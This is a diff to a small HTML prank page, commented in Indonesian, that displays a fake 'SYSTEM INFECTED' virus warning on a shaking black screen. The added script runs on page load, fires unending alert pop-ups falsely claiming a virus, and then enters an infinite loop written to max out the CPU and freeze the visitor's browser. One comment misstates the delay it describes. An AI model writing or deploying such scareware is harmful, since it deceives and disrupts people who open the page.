@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>❌ SYSTEM CRITICAL FAILURE</title>
+  <title>❌ SYSTEM VIRUS DETECTED</title>
   <style>
     body {
       background-color: black;
@@ -10,48 +10,48 @@
       font-family: monospace;
       text-align: center;
       padding-top: 100px;
-    }
-
-    h1 {
-      font-size: 42px;
       animation: shake 0.1s infinite;
     }
 
+    h1 {
+      font-size: 48px;
+    }
+
     @keyframes shake {
-      0% { transform: translate(2px, 1px); }
-      25% { transform: translate(-2px, -1px); }
-      50% { transform: translate(2px, -2px); }
-      75% { transform: translate(-2px, 2px); }
+      0% { transform: translate(1px, 2px); }
+      25% { transform: translate(-1px, -2px); }
+      50% { transform: translate(2px, 2px); }
+      75% { transform: translate(-2px, -1px); }
       100% { transform: translate(0, 0); }
     }
   </style>
 </head>
 <body>
-  <h1>❌ SYSTEM CRITICAL FAILURE</h1>
-  <p>Memory overload. Attempting emergency shutdown...</p>
+  <h1>❌ SYSTEM INFECTED!</h1>
+  <p>Malware detected. Emergency system lockdown initiated...</p>
 
   <script>
-    // Alert spam sebelum lag
-    let count = 0;
-    function warnLoop() {
-      alert("❗ Sistem crash! RAM overload!");
-      count++;
-      if (count < 5) setTimeout(warnLoop, 300);
-      else triggerLag();
+    // SPAM ALERT TANPA HENTI
+    function endlessAlert() {
+      setTimeout(() => {
+        alert("⚠️ SYSTEM ERROR! VIRUS DETECTED!");
+        endlessAlert(); // panggil lagi (tak berujung)
+      }, 100000000000000);
     }
 
-    // Freeze / CPU 100%
-    function triggerLag() {
-      // INFINITE CPU HOG LOOP
+    // CPU USAGE 100% LOOP
+    function burnCPU() {
       while (true) {
-        // Kalkulasi random berat (bikin lag parah)
-        Math.sqrt(Math.random() * Date.now()) * Math.random();
+        Math.sqrt(Math.random() * Date.now());
       }
     }
 
-    // Mulai setelah load
+    // Jalankan saat halaman dibuka
     window.onload = () => {
-      setTimeout(warnLoop, 500);
+      setTimeout(() => {
+        endlessAlert();  // Mulai spam alert
+        burnCPU();       // Mulai lag brutal
+      }, 100); // kasih delay 1 detik biar efeknya tiba-tiba
     };
   </script>
 </body>
